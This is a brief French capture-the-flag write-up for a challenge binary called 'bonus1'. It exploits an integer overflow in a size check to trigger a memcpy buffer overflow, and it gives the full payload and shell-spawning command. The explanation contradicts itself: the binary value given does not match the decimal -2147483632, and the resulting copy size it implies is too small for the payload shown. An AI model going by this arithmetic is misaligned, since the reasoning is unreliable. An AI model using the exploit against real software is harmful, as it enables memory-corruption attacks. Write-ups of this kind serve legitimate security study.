# Bonus1 - Integer Overflow

## Contexte
Le programme prend deux arguments :
- Un nombre qui doit être inférieur à 9
- Une chaîne de caractères qui sera copiée

## Vulnérabilités

**Integer Overflow**
- La vérification `nb > 9` est effectuée
- Un nombre négatif peut passer la vérification
- Après multiplication par 4, le résultat peut devenir un grand nombre positif

**Buffer Overflow**
- memcpy utilise la taille calculée sans vérification
- Permet d'écrire au-delà du buffer alloué

## Exploitation

**Calcul de l'Integer Overflow**
- Valeur recherchée : -2147483632
- En binaire : 1000 0000 0000 0000 0000 0000 0000 0011
- Après multiplication par 4 : 0000 0000 0000 0000 0000 0000 0000 1100

**Construction du Payload**
```python
# Premier argument : integer overflow
"-2147483632"

# Second argument : padding + valeur cible
"A"*40 + "\x46\x4c\x4f\x57"  # "FLOW" en little-endian
```

**Commande d'Exploitation**
```bash
./bonus1 -2147483632 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
```

## Processus d'Exploitation

1. Le nombre négatif passe la vérification `nb > 9`
2. La multiplication par 4 transforme ce nombre en valeur positive
3. memcpy copie suffisamment de données pour atteindre var_3c
4. La valeur 0x574f4c46 est écrite à l'emplacement de var_3c
5. La condition est validée et le shell est exécuté

Citations:
[1] https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/8881945/28258b1b-41a9-4724-96b4-9da451ac675e/paste.txt
